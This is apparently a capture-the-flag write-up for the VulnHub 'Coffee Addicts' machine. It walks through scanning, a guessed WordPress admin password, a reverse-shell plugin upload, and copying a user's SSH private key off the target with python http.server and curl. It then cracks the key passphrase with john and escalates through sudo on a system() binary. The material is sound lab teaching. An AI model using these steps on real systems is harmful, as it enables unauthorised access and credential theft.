#### The challenge is based on : https://www.vulnhub.com/entry/coffee-addicts-1,699/  
another vulnhub boot2root machine, well let's get started! first of all let's use netdiscover to see where the machine is.  

```bash
$ sudo netdiscover
```
![Netdiscover](/1/1.png)

i retrieved the machine as 192.168.3.16, now let's enumerate it with nmap.  
```bash
$ nmap 192.168.3.16 -A
```
![nmap](/1/2.png)

Now we get 80 and 22 which means it has a website and an SSH open for us, let's check the website  
```plain
192.168.3.16:80
```
![3](/1/3.png)
it prompts us to add coddeeaddicts.thm to our hostsfile… fair enough.  
![4](/1/4.png)
it's done and what is this?  
![5](/1/5.png)
this BadByte looks bad… let's see what's beyond this using dirb

```bash
$ dirb http://coffeeaddicts.thm/ "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"
```
![6](/1/6.png)
looks like it has /wordpress site let's check it out!  
![7](/1/7.png)
it looks fantastic for me, now what's beyond this? after i opened the first post it has something interesting…  
![8](/1/8.png)
now password?? alright let's see the post and try to guess which one for our /wp-admin, and it turns out it's just  
```plain
gusineedyouback
```
![9](/1/9.png)
we're in! now what we can do now is to upload a plugin that is capable doing a reverse shell, the payload that i'm using is from a wonderful webiste called sevenlayers go check that out!

![11](/1/11.png)
![12](/1/12.png)
nice! now let's look around on our /home  
![13](/1/13.png)
if we go to the gus directory and we can see the user.txt  
![alt](/1/14.png)
first flag done now what about the readme.txt?  
![alt](/1/15.png)
nothing we can do except going to BadByte home directory  
![alt](/1/16.png)
the .ssh/ folder containing the id_rsa, we can use this.  
![alt](/1/17.png)
let's extract it! on our victim machine we run :  
```bash
$ python3 -m http.server 8080
```
on our attacker machine we run :  
```bash
$ curl coffeeaddicts.thm:8080/id_rsa
$ chmod 600 id_rsa
```

if we do ssh into coffeeaddicts we are prompted with passphrase for our id_rsa… let's bruteforce it using ssh2john  
```bash
$ wget https://raw.githubusercontent.com/openwall/john/bleeding-jumbo/run/ssh2john.py
```
and then run the ssh2john to hash our id_rsa

```bash
$ python3 ssh2john.py id_rsa | tee hash
```

finally we crack it open using john
```bash
$ john hash --wordlist="/usr/share/wordlists/rockyou.txt"
```
![alt](/1/18.png)
we made it! the passphrase is just good ol'
```plain
password
```

now let's ssh into the machine as badbyte for the passphrase and password is the same.  
```bash
$ ssh badbyte@coffeeaddicts.thm -i id_rsa
```
![alt](/1/19.png)
we're in finally let's see the .bash_history if the badbyte guy doing anything  
![alt](/1/20.png)
yup he surely did! there's something on /opt/BadByte let's check it out  
![alt](/1/21.png)
hmm let's see what's this all about  
![alt](/1/22.png)
it's a system command call, what if we run sudo on this machine just like what he did.  
![alt](/1/23.png)
now the system() is considered as root since we pass sudo. to prove my assumption we run whoami :  
![alt](/1/25.png)
as expected, now let's actually become root by using  
```bash
$ su
```
![alt](/1/26.png)

it's officially game over let's see the /root/root.txt for our flag
